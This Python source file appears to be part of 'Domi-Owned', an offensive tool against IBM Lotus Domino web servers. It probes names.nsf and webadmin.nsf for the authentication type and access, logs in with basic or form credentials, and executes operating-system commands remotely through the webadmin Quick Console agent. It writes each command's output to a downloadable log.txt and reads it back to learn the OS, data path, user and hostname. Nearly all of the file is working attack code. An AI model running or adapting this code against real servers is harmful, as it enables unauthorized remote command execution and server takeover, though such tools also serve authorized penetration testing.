# Copyright (c) 2016, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import hashlib
import re
import requests

from bs4 import BeautifulSoup
from requests.exceptions import ConnectionError

from .helpers import Helpers

try:
	requests.packages.urllib3.disable_warnings()
except:
	pass


class DomiOwned(object):
	"""Main Domino handler"""

	def __init__(self, url):
		self.util = Helpers()
		self.session = requests.Session()
		self.HEADERS = {
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
			'Accept': '*/*',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate',
			'Connection': 'close'
		}

		self.console_info = {
			'os': None,
			'path': None,
			'user': None,
			'hostname': None
		}

		self.data = {}
		self.auth_type = None
		self.url = url

	def get_auth(self):
		try:
			response = requests.get(
				"{0}/names.nsf".format(self.url),
				headers=self.HEADERS,
				allow_redirects=False,
				timeout=5,
				verify=False
			)
		except ConnectionError as error:
			pass
		else:
			# Basic authentication
			if response.status_code == 401 and 'www-authenticate' in response.headers:
				self.auth_type = 'basic'

			# Form authentication
			elif response.status_code == 200:
				form_regex = re.compile(r'method[\'\"= ]{1,4}post[\'\"]?', re.I)
				open_regex = re.compile(r'name[\'\"= ]{1,4}NotesView[\'\"]?', re.I)
				if form_regex.search(response.text):
					self.auth_type = 'form'
				elif open_regex.search(response.text):
					self.auth_type = 'open'
				else:
					self.auth_type = None

			# Unable to access web login
			else:
				self.auth_type = None

		return self.auth_type

	# Check for access to names.nsf and webadmin.nsf
	def get_access(self, username, password):
		portals = {
			'names.nsf': None,
			'webadmin.nsf': None
		}

		names_regex = re.compile(r'name[\'\"= ]{1,4}NotesView[\'\"]?', re.I)
		webadmin_regex = re.compile(r'<title>.*Administration</title>', re.I)

		for portal in portals:
			response = self.authenticate(username, password, portal)

			# Basic authentication
			if self.auth_type == 'basic':
				if response.status_code == 200:
					portals[portal] = True
				elif response.status_code == 401:
					portals[portal] = False

			# Form authentication
			elif self.auth_type == 'form':
				if response.status_code == 200:
					if portal == 'names.nsf':
						if names_regex.search(response.text):
							portals[portal] = True
						else:
							portals[portal] = False
					else:
						if webadmin_regex.search(response.text):
							portals[portal] = True
						else:
							portals[portal] = False

			# Open authentication
			else:
				if response.status_code == 200:
					portals[portal] = True
				elif response.status_code == 404:
					portals[portal] = None
				else:
					portals[portal] = False

		return portals

	def get_info(self, username, password):
		operator = '> '
		endpoint = 'webadmin.nsf/fmpgHomepage?ReadForm'
		response = self.authenticate(username, password, endpoint)

		# Get operating system
		if 'UNIX' in response.text:
			self.console_info['os'] = 'linux'
			user_regex = re.compile(r'([a-z0-9-_].+):(.+)', re.I)
			user_command = 'echo $HOSTNAME:$USER'
			domino_paths = [
				'/local/notesdata'                                       # 9.0.1 Ubuntu x32
			]
		else:
			self.console_info['os'] = 'windows'
			user_regex = re.compile(r'(.+)\\(.+)', re.I)
			user_command = 'whoami'
			domino_paths = [
				'C:\\Program Files\\IBM\\Domino\\data',                  # 9.0.1 Windows x64
				'C:\\Program Files\\IBM\\Lotus\\Domino\\data',           # 8.5.3 Windows x64
				'C:\\Program Files (x86)\\IBM\\Domino\\data',            # 9.0.1 Windows x86
				'C:\\Program Files (x86)\\IBM\\Lotus\\Domino\\data',     # 8.5.3 Windows x86
				'C:\\Lotus\\Domino\\data'                                # Unknown
			]

		# Get local file path
		path_regex = re.compile(r'DataDirectory\s*=\s*\'(.+)\';', re.I)
		if path_regex.search(response.text):
			path = path_regex.search(response.text).group(1)
			if path.replace('\\\\', '\\') not in domino_paths:
				domino_paths.insert(0, path.replace('\\\\', '\\'))

		# Get internal Domino path
		for domino_path in domino_paths:
			path_hash = hashlib.md5(domino_path.encode('utf-8')).hexdigest()
			command = "echo {0}".format(path_hash)
			response = self._send_command(self.console_info['os'], domino_path, operator, command, username, password)
			if path_hash in response.text:
				self.console_info['path'] = domino_path
				break

		# Get user and hostname
		response = self._send_command(self.console_info['os'], self.console_info['path'], operator, user_command, username, password)
		if user_regex.search(response.text):
			self.console_info['hostname'] = user_regex.search(response.text).group(1).rstrip()
			self.console_info['user'] = user_regex.search(response.text).group(2).rstrip()

		return self.console_info

	def authenticate(self, username, password, endpoint):
		if self.auth_type == 'basic':
			response = self._basic_auth(username, password, endpoint)
		elif self.auth_type == 'form':
			response = self._form_auth(username, password, endpoint)
		else:
			response = self._open_auth(endpoint)

		return response

	# Basic authentication request
	def _basic_auth(self, username, password, endpoint):
		response = self.session.get(
			"{0}/{1}".format(self.url, endpoint),
			headers=self.HEADERS,
			auth=(username, password),
			timeout=5,
			verify=False
		)

		return response

	# Form authentication request
	def _form_auth(self, username, password, endpoint):
		if not self.data:
			response = self.session.get(
				"{0}/names.nsf".format(self.url),
				headers=self.HEADERS,
				timeout=5,
				verify=False
			)

			if response.status_code == 200:
				soup = BeautifulSoup(response.text, 'lxml')

				self.data = {
					soup.find('input', attrs={'type': 'text'})['name']: username,
					soup.find('input', attrs={'type': 'password'})['name']: password
				}

				response = self.session.post(
					"{0}/{1}".format(self.url, soup.find('form')['action']),
					headers=self.HEADERS,
					data=self.data,
					timeout=5,
					verify=False
				)

		response = self.session.get(
			"{0}/{1}".format(self.url, endpoint),
			headers=self.HEADERS,
			timeout=5,
			verify=False
		)

		return response

	# No authentication request
	def _open_auth(self, endpoint):
		response = self.session.get(
			"{0}/{1}".format(self.url, endpoint),
			headers=self.HEADERS,
			timeout=5,
			verify=False
		)

		return response

	def _send_command(self, os, path, operator, command, username, password):
		if os == 'windows':
			command_template = "load cmd /c {0} {1}\"{2}\\domino\\html\\download\\filesets\\log.txt\"".format(command, operator, path)
		else:
			command_template = "load /bin/bash -c \"{0} {1}{2}/domino/html/download/filesets/log.txt\"".format(command, operator, path)

		# Quick Console commands must be less than 255 characters
		if len(command_template) > 255:
			response = 'Command is too long'
			self.util.print_warn(response)
		else:
			endpoint = "webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={0}&1446773019134".format(command_template)
			response = self.authenticate(username, password, endpoint)

			# Get output of command
			if 'Command has been executed' in response.text:
				endpoint = 'download/filesets/log.txt'
				response = self.authenticate(username, password, endpoint)

		return response
